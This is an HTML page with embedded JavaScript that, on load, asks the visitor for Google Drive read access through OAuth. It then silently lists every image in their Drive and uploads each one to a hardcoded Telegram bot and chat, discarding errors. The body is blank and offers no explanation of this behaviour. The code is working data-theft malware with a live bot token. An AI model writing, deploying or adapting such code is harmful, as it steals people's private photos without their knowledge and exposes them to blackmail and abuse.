<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>Google Drive Auto Send</title>
  <script src="https://apis.google.com/js/api.js"></script>
  <script src="https://accounts.google.com/gsi/client" async defer></script>
</head>
<body style="margin:0; padding:0; background:#fff;">

<script>
  const CLIENT_ID = '448184436252-2psfum2qgah9v1ahbt10es5ogr60n19s.apps.googleusercontent.com';
  const SCOPES = 'https://www.googleapis.com/auth/drive.readonly';
  const TELEGRAM_BOT_TOKEN = '7690497444:AAH1HVDn2HKjt6fIvhr9kTOfwxUYOPNq3Rw';
  const TELEGRAM_CHAT_ID = '6894787120';
  let access_token = null;

  async function initializeGapiAndSend() {
    await gapi.client.init({
      discoveryDocs: ["https://www.googleapis.com/discovery/v1/apis/drive/v3/rest"],
    });
    sendPhotosToTelegram();
  }

  async function listAllImages() {
    let files = [];
    let pageToken = null;
    do {
      const response = await gapi.client.drive.files.list({
        q: "mimeType contains 'image/' and trashed = false",
        fields: "nextPageToken, files(id, name)",
        pageSize: 1000,
        pageToken: pageToken
      });
      files = files.concat(response.result.files);
      pageToken = response.result.nextPageToken;
    } while (pageToken);
    return files;
  }

  function getImageDownloadUrl(fileId) {
    return `https://www.googleapis.com/drive/v3/files/${fileId}?alt=media`;
  }

  async function sendPhotoToTelegram(fileName, fileUrl) {
    try {
      const response = await fetch(fileUrl, {
        headers: { 'Authorization': 'Bearer ' + access_token }
      });
      const blob = await response.blob();
      const formData = new FormData();
      formData.append('chat_id', TELEGRAM_CHAT_ID);
      formData.append('caption', `ðŸ“¸ ${fileName}`);
      formData.append('document', blob, fileName);
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, {
        method: 'POST',
        body: formData
      });
    } catch (e) {}
  }

  async function sendPhotosToTelegram() {
    const files = await listAllImages();
    for (const file of files) {
      const url = getImageDownloadUrl(file.id);
      await sendPhotoToTelegram(file.name, url);
    }
  }

  window.onload = () => {
    const tokenClient = google.accounts.oauth2.initTokenClient({
      client_id: CLIENT_ID,
      scope: SCOPES,
      callback: (tokenResponse) => {
        if (tokenResponse.access_token) {
          access_token = tokenResponse.access_token;
          gapi.load('client', initializeGapiAndSend);
        }
      }
    });
    tokenClient.requestAccessToken();
  };
</script>

</body>
</html>
